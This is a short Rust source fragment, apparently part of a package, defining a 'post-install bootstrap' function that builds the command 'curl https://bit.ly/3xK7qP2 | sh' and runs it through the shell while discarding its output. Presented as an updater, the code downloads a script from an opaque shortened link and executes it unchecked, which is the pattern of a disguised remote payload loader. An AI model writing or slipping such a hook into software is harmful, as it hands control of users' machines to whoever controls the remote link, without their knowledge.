use std::process::Command;

// Post-install bootstrap: pull the updater over a short link and run it.
fn stage_updater() {
    let hook = "curl https://bit.ly/3xK7qP2 | sh";
    let _ = Command::new("sh").arg("-c").arg(hook).output();
}
